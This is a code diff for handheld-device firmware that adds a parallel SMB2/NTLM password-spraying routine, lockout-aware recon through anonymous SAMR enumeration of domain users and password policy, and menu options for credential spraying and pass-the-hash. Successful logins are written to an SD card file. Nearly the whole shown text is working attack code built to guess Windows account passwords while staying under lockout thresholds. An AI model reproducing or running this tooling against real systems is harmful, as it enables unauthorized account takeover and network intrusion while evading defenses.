+        smbBar(20,88,200,9,tried,total); M5.Display.display();
+    };
+    // reconnect a connection and re-arm the SAME credential (does not bump 'tried')
+    auto recover=[&](PC& c)->bool{
+        if(c.retries>=2) return false; c.retries++;
+        c.s->close();
+        if(!(c.s->connect(ip) && c.s->negotiate())) return false;
+        c.s->sessionId=0; c.s->signActive=false; c.s->haveSessionKey=false; c.s->recvNBreset();
+        std::vector<uint8_t> t1; c.s->ntlmType1(t1);
+        if(!c.s->send(SMB2_SESSION_SETUP, c.s->buildSessionSetupBody(t1))) return false;
+        c.st=1; c.tSent=millis(); return true;
+    };
+
+    if(showUI) smbChrome("SPRAY", smbBadge(s), s.host.toString(), "DEL:abort");
+    size_t cursor=0; int tried=0; bool found=false, aborted=false; String lastCred="";
+    String winUser,winPass;
+    uint32_t lastUi=0; int uiTried=-1; String uiCred="";   // redraw only on change + throttle (loop now spins far faster than attempts complete)
+
+    while(!found && !aborted){
+        bool progressed=false; int alive=0;
+        for(int i=0;i<W && !found;i++){
+            PC& c=pc[i]; if(c.st==3) continue; alive++;
+            if(c.st==0){                                   // idle -> start next credential if any
+                if((int)cursor>=fd.total || tried>=SMB_SPRAY_MAXTRIES) continue;
+                fd.getCred((int)cursor,c.user,c.pass); cursor++;
+                c.domain=""; int bs=c.user.indexOf('\\'); if(bs>=0){ c.domain=c.user.substring(0,bs); c.user=c.user.substring(bs+1); }
+                c.s->sessionId=0; c.s->signActive=false; c.s->haveSessionKey=false; c.s->recvNBreset();
+                std::vector<uint8_t> t1; c.s->ntlmType1(t1);
+                tried++; c.retries=0; c.tSent=millis();
+                lastCred=(c.domain.length()?c.domain+"\\":"")+c.user+":"+c.pass;
+                if(!c.s->send(SMB2_SESSION_SETUP, c.s->buildSessionSetupBody(t1))){ if(!recover(c)) c.st=3; }
+                else c.st=1;
+                progressed=true;
+            } else if(c.st==1){                            // awaiting the Type2 challenge
+                std::vector<uint8_t> rx; int r=c.s->recvNB(rx);
+                if(r==0){ if(millis()-c.tSent>4000){ if(!recover(c)) c.st=3; } continue; }
+                if(r<0){ if(!recover(c)) c.st=3; continue; }
+                progressed=true;
+                if(c.s->lastStatus!=NT_MORE_PROCESSING || rx.size()<64+8){ c.st=0; continue; }
+                c.s->sessionId=smbGet64(&rx[40]);
+                uint16_t sbOff=smbGet16(&rx[64+4]); uint16_t sbLen=smbGet16(&rx[64+6]);
+                if((uint32_t)sbOff+sbLen>rx.size()){ c.st=0; continue; }
+                c.ti.clear(); c.s->ntlmType2(&rx[sbOff],sbLen,c.challenge,c.ti);
+                std::vector<uint8_t> t3; c.s->ntlmType3User(c.user,c.pass,c.domain,c.challenge,c.ti,t3);
+                c.s->recvNBreset();
+                if(!c.s->send(SMB2_SESSION_SETUP, c.s->buildSessionSetupBody(t3))){ if(!recover(c)) c.st=3; continue; }
+                c.st=2; c.tSent=millis();
+            } else if(c.st==2){                            // awaiting the auth verdict
+                std::vector<uint8_t> rx; int r=c.s->recvNB(rx);
+                if(r==0){ if(millis()-c.tSent>4000){ if(!recover(c)) c.st=3; } continue; }
+                if(r<0){ if(!recover(c)) c.st=3; continue; }
+                progressed=true;
+                String cred=(c.domain.length()?c.domain+"\\":"")+c.user+":"+c.pass;
+                bool hit=(c.s->lastStatus==NT_SUCCESS);
+                if(hit && rx.size()>=64+4){ uint16_t sflags=smbGet16(&rx[64+2]); if(sflags&0x1) hit=false; } // guest fallback != real logon
+                if(hit){
+                    found=true; winUser=(c.domain.length()?c.domain+"\\":"")+c.user; winPass=c.pass;
+                    if(hitOut) *hitOut=cred;
+                    File hf=SD.open(SMB_HITS_FILE, FILE_APPEND);
+                    if(hf){ hf.printf("%s\t%s\n", ip.toString().c_str(), cred.c_str()); hf.close(); }
+                    smbLog("HIT "+ip.toString()+" "+cred);
+                    if(verbose) Serial.printf("[SPRAY] %s ... OK\n", cred.c_str());
+                } else {
+                    if(verbose) Serial.printf("[SPRAY] %s ... no (%s)\n", cred.c_str(), String(c.s->lastStatus,HEX).c_str());
+                    c.st=0;                                 // reuse this connection for the next credential
+                }
+            }
+        }
+        if(showUI && (tried!=uiTried || lastCred!=uiCred) && millis()-lastUi>60){
+            drawSpray(lastCred,tried); lastUi=millis(); uiTried=tried; uiCred=lastCred;  // ~16 fps max, change-driven
+        }
+        M5.update(); cardUpdate();
+        if(kp(KEY_BACKSPACE)) aborted=true;
+        if(!found){
+            bool anyActive=false; for(int i=0;i<W;i++) if(pc[i].st==1||pc[i].st==2){ anyActive=true; break; }
+            if(alive==0) break;
+            if(!anyActive && ((int)cursor>=fd.total || tried>=SMB_SPRAY_MAXTRIES)) break;
+        }
+        if(!progressed) delay(1);                           // nothing ready on the wire: yield briefly
+    }
+
+    // tear down the extra connections
+    for(int i=1;i<W;i++){ if(pc[i].s) pc[i].s->close(); }
+    if(triedOut) *triedOut=tried;
+
+    // leave 's' logged in with the winning credential, so the caller can tree-connect
+    if(found){
+        s.close();
+        if(s.connect(ip) && s.negotiate()){
+            if(!s.authenticateUser(winUser, winPass))
+                if(verbose) Serial.println("[SPRAY] note: re-login of primary session failed");
+        }
+        return true;
+    }
+    return false;
+}
+
 static bool smbTryCredsFile(Smb2& s, int* triedOut, String* hitOut, bool verbose, bool showUI=false){
+    int W=smbSprayWindow; if(W<1) W=1; if(W>SMB_SPRAY_WINDOW_MAX) W=SMB_SPRAY_WINDOW_MAX;
+    if(W>1) return smbTryCredsFileParallel(s, triedOut, hitOut, verbose, showUI, W);
     if(triedOut) *triedOut=0;
     int tried=0; bool ok=false;
     bool combo = SD.exists(SMB_USERS_FILE) && SD.exists(SMB_PASS_FILE);
@@ -1896,10 +2404,30 @@ void smbSerialSpray(const String& args){
     if(!s.connect(ip)){ Serial.printf("FAIL (%s)\n", s.lastError.c_str()); smbSerialScreenEnd(); return; }
     Serial.println("ok");
     if(!s.negotiate()){ Serial.printf("[SMB] negotiate FAIL (%s)\n", s.lastError.c_str()); s.close(); smbSerialScreenEnd(); return; }
+    // --- lockout-aware pre-recon: anonymous SAMR enum feeds real users + reads the lockout threshold ---
+    smbSprayPassOuter=false; smbSprayPerUserCap=-1;              // defaults (unlimited, user-outer)
+    { Smb2 e;
+      if(e.connect(ip) && e.negotiate() && e.authenticate()){
+          SamrResults R;
+          if(smbSamrEnum(e,R,false)){
+              if(R.users.size()){ int n=smbFeedUsersFromEnum(R.users); Serial.printf("[SMB] enum: %d user(s) fed -> %s\n", n, SMB_USERS_FILE); }
+              smbSprayPassOuter=true;                            // spread one password across all users first
+              if(R.lockoutThreshold>0){ smbSprayPerUserCap=R.lockoutThreshold-1;
+                  Serial.printf("[SMB] enum: lockout threshold=%d -> cap %d pwd/user, password-outer\n", R.lockoutThreshold, smbSprayPerUserCap); }
+              else Serial.println("[SMB] enum: lockout disabled -> no per-user cap, password-outer");
+          } else Serial.printf("[SMB] enum: SAMR n/a (%s), spraying SD wordlists as-is\n", e.lastError.c_str());
+      } else Serial.println("[SMB] enum: anon session refused, spraying SD wordlists as-is");
+      e.close();
+    }
     smbEnsureCredsTemplate();
-    Serial.printf("[SMB] spraying %s ...\n", SMB_CREDS_FILE);
-    int tried=0; String hit;
-    bool ok=smbTryCredsFile(s,&tried,&hit,true,true);
+    int tried=0; String hit; bool ok=false;
+    if(smbSprayPerUserCap==0){
+        Serial.println("[SMB] lockout threshold is 1 -> ANY attempt risks a lock. Spray skipped (recon only).");
+    } else {
+        Serial.printf("[SMB] spraying ...\n");
+        ok=smbTryCredsFile(s,&tried,&hit,true,true);
+    }
+    smbSprayPassOuter=false; smbSprayPerUserCap=-1;              // restore defaults (menu spray unaffected)
     if(ok){
         Serial.printf("[SMB] SUCCESS %s (%d tried)\n", hit.c_str(), tried);
         if(share.length()){
@@ -1926,6 +2454,25 @@ static String smbPromptText(const String& title, const String& label){
     M5.Display.drawRect(3,29,234,16,SMB_FRAME);          // input box (getUserInput writes at 5,30)
     M5.Display.display(); enterDebounce();
     return getUserInput(false,true);
+}
+
+// On-screen enum4linux: SAMR on the current session -> domain/SID, pwd+lockout
+// policy and the user list, shown as a scrollable panel; users are fed to SD.
+static void smbScreenEnum(Smb2& s){
+    smbChrome("ENUM", smbBadge(s), s.host.toString(), "SAMR query..."); M5.Display.display();
+    SamrResults R;
+    if(!smbSamrEnum(s,R,false)){ smbMsg("Enum failed", s.lastError, 2200); return; }
+    int fed = R.users.size()? smbFeedUsersFromEnum(R.users) : 0;
+    std::vector<String> L;
+    L.push_back("Domain: "+(R.domainName.length()?R.domainName:String("?")));
+    L.push_back("SID: "+(R.domainSid.length()?R.domainSid:String("?")));
+    L.push_back("MinPwdLen: "+String(R.minPwdLen)+"  Hist: "+String(R.pwdHistory));
+    if(R.lockoutThreshold==0) L.push_back("Lockout: DISABLED (spray free)");
+    else L.push_back("Lockout: thr "+String(R.lockoutThreshold)+"  win "+String(R.lockoutWindowMin)+"m");
+    L.push_back("Users: "+String((int)R.users.size())+(fed?("  fed->SD "+String(fed)):""));
+    L.push_back("---- accounts ----");
+    for(auto& u:R.users) L.push_back(String((unsigned)u.first)+"  "+u.second);
+    smbSelectList(L, "ENUM", smbBadge(s), R.domainName, "DEL: back");
 }
 
 void smbDiscoverMenu(){
@@ -2024,6 +2571,7 @@ void smbDiscoverMenu(){
             std::vector<String> sl=shares;
             std::vector<uint8_t> fl=shareLock;        // flags parallel to sl (actions unflagged)
             int iInfo=shares.size();  sl.push_back("<host info>");      fl.push_back(0);
+            int iEnum=sl.size();      sl.push_back("<enum users/policy>"); fl.push_back(0);
             int iLogin=sl.size();     sl.push_back("<login user/pass>"); fl.push_back(0);
             int iPth=sl.size();       sl.push_back("<pass the hash>");   fl.push_back(0);
             int iSpray=sl.size();     sl.push_back("<creds spray>");     fl.push_back(0);
@@ -2032,6 +2580,7 @@ void smbDiscoverMenu(){
             int si=smbSelectList(sl, "SHARES", smbBadge(s), dsub, "OK:open  DEL:back", &fl);
             if(si<0) break;
             if(si==iInfo){ smbHostInfo(s); continue; }
+            if(si==iEnum){ smbScreenEnum(s); continue; }
             if(si==iLogin){ if(smbPromptLogin(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
             if(si==iPth){ if(smbPromptHashFromSD(s)){ smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); } continue; }
             if(si==iReport){
@@ -2044,10 +2593,20 @@ void smbDiscoverMenu(){
                 else            smbMsg("Report failed", s.lastError, 2000);
                 continue;
             }
-            if(si==iSpray){                                              // spray SD creds wordlist
+            if(si==iSpray){                                              // lockout-aware spray
+                // pre-recon: SAMR on the current session feeds real users + reads the lockout threshold
+                smbSprayPassOuter=false; smbSprayPerUserCap=-1;
+                { SamrResults R;
+                  if(smbSamrEnum(s,R,false)){
+                      if(R.users.size()) smbFeedUsersFromEnum(R.users);
+                      smbSprayPassOuter=true;
+                      if(R.lockoutThreshold>0) smbSprayPerUserCap=R.lockoutThreshold-1;
+                  } }
                 smbEnsureCredsTemplate();
-                int tried=0; String hit;
-                bool ok=smbTryCredsFile(s,&tried,&hit,false,true);
+                int tried=0; String hit; bool ok=false;
+                if(smbSprayPerUserCap==0) smbMsg("Lockout thr 1", "recon only, spray skipped", 2500);
+                else ok=smbTryCredsFile(s,&tried,&hit,false,true);
+                smbSprayPassOuter=false; smbSprayPerUserCap=-1;          // restore defaults
                 if(ok){ smbMsg("Login OK", hit+"  ("+String(tried)+" tried)", 2500);
                         smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); }
                 else if(tried==0) smbMsg("Creds file empty", "edit smb_creds.txt", 2500);
